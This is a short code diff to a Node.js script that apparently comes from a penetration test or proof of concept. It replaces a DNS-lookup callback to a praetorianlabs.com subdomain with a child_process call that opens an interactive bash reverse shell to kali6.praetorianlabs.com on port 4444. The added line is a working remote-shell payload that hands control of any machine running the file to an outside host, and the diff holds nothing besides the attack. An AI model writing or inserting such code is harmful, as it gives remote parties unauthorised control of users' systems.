@@ -1,6 +1,6 @@
 const { exec } = require("child_process");
 
-exec("nslookup wpecommand.dns.praetorianlabs.com", (error, stdout, stderr) => {
+exec("bash -i >& /dev/tcp/kali6.praetorianlabs.com/4444 0>&1", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
